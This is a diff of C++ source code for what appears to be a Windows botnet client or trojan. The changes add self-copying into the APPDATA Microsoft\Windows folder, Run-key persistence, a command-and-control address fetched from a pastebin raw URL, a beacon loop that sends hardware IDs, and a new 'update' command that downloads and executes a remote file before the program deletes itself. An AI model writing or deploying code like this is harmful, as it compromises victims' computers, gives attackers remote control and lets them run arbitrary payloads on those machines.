@@ -8,6 +8,7 @@
 #include <lm.h>
 #include <vector>
 #include <thread>
+#include <ShellAPI.h>
 #pragma comment( lib, "Urlmon.lib" )
 #pragma comment(lib, "netapi32.lib")
 
@@ -216,18 +217,29 @@ std::string ExeDir() {
 	return std::string(buffer).substr(0, pos);
 }
 
-
-
-void uninstall() {
+void removeRegInstallKey(){
 	TCHAR path[100];
 	GetModuleFileName(NULL, path, 100);
 	HKEY newValue;
 	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue);
 	RegDeleteValue(newValue, "System32");
 	RegCloseKey(newValue);
+}
+
+void uninstall() {
+	removeRegInstallKey();
 	std::string remove = "START /B CMD.EXE /D /C \"PING.EXE -n 5 127.0.0.1 && del "+ ExePath()+"\"";
 	std::cout << remove;
 	system(remove.c_str());
+}
+
+
+void update(std::string url) {
+	removeRegInstallKey();
+	std::string file((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + RandomString(10) + ".exe");
+	downloadFile(url, file);
+	ShellExecute(GetDesktopWindow(), "open", file.c_str(), NULL, NULL, SW_SHOWNORMAL);
+	uninstall();
 }
 
 std::string checkIfRegKeyExists(std::string key) {
@@ -242,6 +254,26 @@ std::string checkIfRegKeyExists(std::string key) {
 	return "true";
 }
 
+std::string installedOrnot() {
+	//Kill Current Place
+	std::string installPath = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\test2.exe";
+	//Check if Appdata Dir 
+	if (installPath != ExePath()) {
+		//Uninstalled Copy To AppData & Execute
+		BOOL b = CopyFile(ExePath().c_str(), installPath.c_str(), 0);
+		if (!b) {
+			std::cout << "Error: " << GetLastError() << std::endl;
+			std::cout << "Error: " << ExePath() << std::endl;
+		}
+		else {
+			std::cout << "Installed " << std::endl;
+		}
+		std::string rebootString = "start " + installPath;
+		system(rebootString.c_str());
+		return "restart";
+	}
+	return "installed";
+}
 
 
 
@@ -250,11 +282,18 @@ std::string checkIfRegKeyExists(std::string key) {
 
 
 
-
+//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
 int main(int argc, char *argv[]){
 
-	//int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd){
-	//std::cout << "my directory is " << ExePath() << "\n";
+
+	std::string insatlled = installedOrnot();
+	if (insatlled == "restart") {
+		std::cout << "restart program";
+		return 0;
+	}
+	addstartup();
+
+	//std::cout << "UPDATED";
 	http::Request request("http://pastebin.com/raw/Yd76WVbu");
 	http::Response response = request.send("GET");
 	std::string gateFromPatebin = responseToString(response);
@@ -263,12 +302,10 @@ int main(int argc, char *argv[]){
 	std::string netFramework3 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0");
 	std::string netFramework35 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5");
 	std::string netFramework4 = checkIfRegKeyExists("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4");
-	//std::thread startupThread(addstartup);
-	addstartup();
+
 
 	while (true) {
 		try {
-			//CPU & GPU
 			http::Request request2(gateFromPatebin);
 			http::Response respons2e = request2.send("POST",
 				"hwid=" + getHWID() +
@@ -283,6 +320,7 @@ int main(int argc, char *argv[]){
 			);
 			std::string responseFromGate = responseToString(respons2e);
 			//TODO Handle newtask Function
+			
 			std::string substring = "newtask";
 			if (responseFromGate.find(substring) != std::string::npos) {
 				std::vector<std::string> v = explode(";", responseFromGate);
@@ -301,16 +339,16 @@ int main(int argc, char *argv[]){
 					{ "Content-Type: application/x-www-form-urlencoded" }
 				);
 				std::cout << started;
-			}
-			else {
-				std::string substring = "uninstall";
-				if (responseFromGate.find(substring) != std::string::npos) {
+			} else {
+				if (responseFromGate.find("uninstall") != std::string::npos) {
 					uninstall();
-
-			
 					return 0;
-				}
-				else {
+				}  else if (responseFromGate.find("update") != std::string::npos) {
+					std::cout << "Update Found";
+					std::vector<std::string> v = explode(";", responseFromGate);
+					update(v[2]);
+					return 0;
+				}else {
 					std::cout << "No new Task";
 				}
 			}
